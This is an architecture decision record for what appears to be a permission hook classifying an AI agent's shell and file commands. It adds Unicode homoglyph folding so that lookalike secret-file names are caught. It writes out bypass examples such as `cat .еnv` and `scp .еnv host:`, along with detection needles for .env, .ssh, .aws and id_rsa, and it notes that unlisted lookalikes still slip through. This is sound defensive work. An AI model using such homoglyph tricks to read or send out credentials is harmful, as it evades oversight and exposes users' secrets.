# ADR 0007 — Unicode homoglyph fold for sensitive needles (2026-07)

## Status

Accepted (2026-07-09).

## Context

ADR 0001 / 0002 B1 deferred Unicode homoglyph bypasses such as
`cat .еnv` (Cyrillic `е` U+0435) because a general NFKC + confusables
table is large and would add a dependency, conflicting with Minimal
Dependencies.

The sensitive needle alphabet is bounded (roughly the letters in
`.env` / `.ssh` / `.aws` / `npmrc` / `pypirc` / `id_rsa` / `credentials`
shapes). A hand-written lookalike→ASCII fold of ~30–40 entries closes
the known gap without new crates.

Bash tokens add a second wrinkle: `shell::push_latin1` widens non-ASCII
bytes to Latin-1 code points, so UTF-8 `.еnv` (`D0 B5`) becomes argv
mojibake `.Ðµnv`. The fold helper recovers that mojibake before folding;
the parser itself is unchanged.

## Decision

1. Add `fold_sensitive_homoglyphs` in `src/facts/sensitive.rs` (single
   source of truth):
   - ASCII-only → `Cow::Borrowed` (zero cost).
   - If every char ≤ U+00FF, attempt Latin-1→UTF-8 redecode (Bash path).
   - Map Cyrillic / Greek needle lookalikes to ASCII via a `match` table.
   - Characters outside the table pass through (fail-closed; no
     "non-ASCII ⇒ ask" rule, which would FP on `資料.txt`).
2. Apply the fold **before** `needle_mask` / regex in both
   `classify_into` and `matches_sensitive_path` so classifier parity
   (`pbt_sensitive_path_matches_classify`) holds.
3. Flip corpus `gap-unicode-homoglyph` to `must_catch` / ask and add
   `scp .еnv host:` as `must_catch` / deny.
4. Do **not** change `push_latin1` or the PROBES / SENSITIVE_NEEDLES sets.

## Consequences

### Positive

- `cat .еnv` → Ask (`sensitive-bash-read`); `scp .еnv host:` → Deny
  (`sensitive-path-to-network`); Read/Edit of a Cyrillic-homoglyph
  dotenv path → Deny (`sensitive-read`).
- No new dependency; ASCII-only hook calls pay nothing.

### Negative

- The fold table is incomplete by design. A lookalike for a needle
  letter that is not listed still bypasses until the table is extended.
- Successful Latin-1→UTF-8 recovery rewrites Bash argv tokens for
  classification only; audit / reason strings that echo folded `raw`
  may show the ASCII form rather than the original glyphs.

### Known limitations (unchanged / deferred)

- Full Unicode confusables / NFKC normalization remain out of scope.
- ADR 0002 B2/~~B5~~/C2 (symlink / ~~cmdsubst outer-nonreader~~ / variable head).
  B5 is resolved by ADR 0008; B2/C2 remain open.

## Implementation map

| 項目 | ファイル | 主要変更 |
| --- | --- | --- |
| fold helper | `src/facts/sensitive.rs` | `fold_sensitive_homoglyphs` + table; `classify_into` prefix |
| Bash parity | `src/rules/patterns.rs` | `matches_sensitive_path` uses same fold |
| pin / corpus | `sensitive_bash_read.rs`, `tests/bypass/corpus.jsonl` | ask/deny expectations |
| docs | ADR 0001/0002, `policy-packs.md`, checklist | B1 marked resolved |
